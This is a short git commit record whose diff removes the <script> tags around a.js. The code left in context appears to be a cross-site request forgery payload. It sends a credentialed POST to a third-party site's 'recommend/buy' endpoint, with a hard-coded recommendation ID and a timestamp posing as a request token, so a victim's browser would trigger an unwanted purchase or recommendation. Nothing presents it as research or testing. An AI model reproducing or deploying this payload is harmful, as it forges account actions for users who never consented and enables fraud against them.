abdd968c19f92feaf93eeabb6d07a200cbe55d90
fashao <ufo@cs229.com>
2016-08-11 14:43:58 +0800

    jj

--- a.js
+++ a.js
@@ -1,4 +1,3 @@
-<script type="text/javascript">
 var xmlhttp;
 if (window.XMLHttpRequest)
   {// code for IE7+, Firefox, Chrome, Opera, Safari
@@ -15,4 +14,3 @@ xmlhttp.onreadystatechange=function()
 xmlhttp.withCredentials = true;
 xmlhttp.open("POST","http://www.fox008.com/YP/recommend/buy?t="+String(new Date().getTime())+"&recommendId=888658&request_token="+String(new Date().getTime()),true);
 xmlhttp.send(null);
-</script>
